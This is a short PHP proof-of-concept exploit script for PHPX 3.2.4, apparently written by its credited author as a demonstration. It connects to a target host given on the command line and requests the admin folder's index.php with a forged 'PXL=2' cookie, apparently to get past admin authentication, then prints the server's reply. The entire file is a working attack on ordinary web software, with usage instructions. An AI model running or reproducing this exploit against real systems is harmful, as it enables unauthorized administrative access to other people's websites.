<?php
/* Proof of concept for exploiting PHPX 3.2.4 (http://www.phpx.org) */
/* Quick hack, not really an affective tool, only useful as a demonstration */
/* Written by HelloWorld - Ryan Wray */

/* Usage: php -q exploit_file.php <host> <port> <admin_folder_location> */
function usage()
{
    echo "Usage request";
}

function bytes_left($fp)
{
    $status=socket_get_status($fp);
    if($status['unread_bytes'] > 0) { return true; }
    return false;
}
print_r($_SERVER['argv']);
if($_SERVER['argc'] != 4)
{
    exit(usage());
}

// Attempt to connect to host.
$fp=@fsockopen($_SERVER['argv'][1],$_SERVER['argv'][2]);

if(!$fp)
{
    exit('Could not connect to host: '.$_SERVER['argv'][1].':'.$_SERVER['argv'][2]);
}

else
{
    fputs($fp,"GET ".$_SERVER['argv'][3]."index.php HTTP/1.1\r\n");
    fputs($fp,"Host: ".$_SERVER['argv'][1]."\r\n");
    fputs($fp,"Cookie: PXL=2\r\n\r\n");
}
// Start accepting data, otherwise socket_get_status will say there are 0 unread bytes.
echo fgets($fp,1024);
// While we can read.
while(bytes_left($fp))
{
    echo fgets($fp,1024);
}
// Close the socket.
fclose($fp);
?>
